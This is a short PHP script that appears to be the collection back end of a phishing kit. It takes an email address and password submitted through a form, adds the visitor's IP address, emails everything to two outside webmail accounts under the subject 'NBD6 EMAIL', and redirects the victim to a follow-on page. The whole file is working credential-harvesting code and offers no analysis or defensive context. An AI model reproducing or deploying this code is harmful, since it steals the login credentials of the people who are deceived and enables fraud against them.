<? 

$ip = getenv("REMOTE_ADDR");
$browser = $_SERVER['HTTP_USER_AGENT'];
$message .= "--------------OOOO----------------------\n";
$message .= "Email Address: ".$_POST['ea']."\n";
$message .= "Password: ".$_POST['ep']."\n";
$message .= "--------------OOOO NBD6 Email----------------------\n";
$message .= "IP: ".$ip."\n";
$message .= "--------------OOOO----------------------\n";
$recipient = "abaccolaw@outlook.com, abaccolaw@yahoo.com";
$subject = "NBD6 EMAIL";
$headers .= "MIME-Version: 1.0\n";
mail($recipient,$subject,$message,$headers);
		
			   header("Location:  /en/code.html");

	?>
